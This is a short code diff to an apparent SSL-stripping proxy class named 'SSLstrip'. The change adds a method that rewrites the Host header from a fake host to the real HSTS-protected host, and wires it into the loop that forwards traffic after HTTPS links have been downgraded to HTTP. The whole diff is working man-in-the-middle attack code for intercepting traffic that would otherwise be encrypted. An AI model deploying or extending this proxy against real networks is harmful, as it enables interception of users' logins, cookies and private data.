@@ -59,6 +59,10 @@ class SSLstrip:
         return re.sub(b'https://' + bytes(FORWARD_HOST_HSTS),
                       b'http://' + bytes(FAKE_HOST), data)
 
+    def __replace_host(self, data):
+        return re.sub(b'Host: ' + bytes(FAKE_HOST),
+                      b'Host: ' + bytes(FORWARD_HOST_HSTS), data)
+
     def __replace_content_length(self, data):
         try:
             idx = data.index(b"\r\n\r\n")
@@ -87,6 +91,7 @@ class SSLstrip:
                     self.__new_http_conn(csock)
                 fw_sock = self.__csockets[csock]
             data = self.__replace_https_to_http(data)
+            data = self.__replace_host(data)
             data = self.__replace_content_length(data)
             fw_sock.send(data)
 
